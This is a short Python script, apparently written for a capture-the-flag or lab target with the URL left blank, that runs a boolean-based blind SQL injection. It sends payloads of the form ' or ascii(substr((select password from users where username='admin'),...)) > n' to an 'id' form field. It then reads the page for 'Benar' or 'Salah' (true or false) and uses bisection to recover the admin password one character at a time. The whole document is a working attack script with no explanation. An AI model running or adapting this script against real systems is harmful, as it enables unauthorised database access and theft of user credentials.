#!/usr/bin/python

from bs4 import BeautifulSoup
import requests, sys

def write(s):
	sys.stdout.write(s)
	sys.stdout.flush()

def bisection(name,length):
	ret = [' ']*(length+1)
	idx = 1
	while idx <= (length+1):
		low = 0
		high = 255
		write('\r' + "{}: {}".format(name,''.join(ret)))
		while low <= high:
			mid = (low+high)/2
			# print low, mid, high
			payload = "3' or ascii(substr((select password from users where username='admin'),{},1)) > {} -- ".format(str(idx),mid)
			data = {"id":payload,"submit":"Submit"}
			p = s.post(url, data=data)
			soup = BeautifulSoup(p.content,"html.parser")
			if "Benar" in soup.get_text():
				low = mid+1
			elif "Salah" in soup.get_text():
				high = mid-1
				payload = "3' or ascii(substr((select password from users where username='admin'),{},1)) = {} -- ".format(str(idx),mid)
				data = {"id": payload, "submit": "Submit"}
				p = s.post(url, data=data)
				soup = BeautifulSoup(p.content,"html.parser")
				if "Benar" in soup.get_text():
					ret[idx-1] = chr(mid)
					idx += 1
					break

	write('\n')

url = "http://"
s = requests.Session()
bisection("password",50)